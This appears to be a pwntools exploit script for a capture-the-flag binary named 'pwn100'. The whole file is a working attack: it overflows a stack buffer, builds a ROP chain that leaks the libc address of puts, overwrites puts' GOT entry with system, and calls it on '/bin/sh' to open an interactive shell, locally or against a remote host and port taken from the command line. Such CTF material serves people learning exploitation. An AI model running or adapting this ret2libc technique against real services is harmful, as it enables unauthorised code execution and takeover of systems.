#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 0
arch_64 = 1
exe = "./pwn100"

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    libc = e.libc
if arch_64:
    arena = 0x3c4b20
    context.arch = "amd64"
else:
    arena = 0x1b2780
    context.arch = "i386"

def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp

def z():
    gdb.attach(p)

rop = ROP(e)
puts_plt = e.plt["puts"]
read_plt = e.plt["read"]
puts_got = e.got["puts"]
rop.raw("A"*72)
rop.call(puts_plt,[puts_got])
rop.call(read_plt,[0,puts_got])
rop.raw(0x40068e)

print rop.dump()
p1 = rop.chain()
p1 = p1.ljust(200,"b")
sd(p1)

addr = u64(ru("\x7f")[-6:].ljust(8,"\x00"))
libc.address = addr - libc.symbols["puts"]
sys = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()

sl(p64(sys))

rdi = rop.rdi[0]
p2 = flat(["A"*72,rdi,bin_sh,puts_plt])
p2 = p2.ljust(200,"b")
sl(p2)

p.interactive()


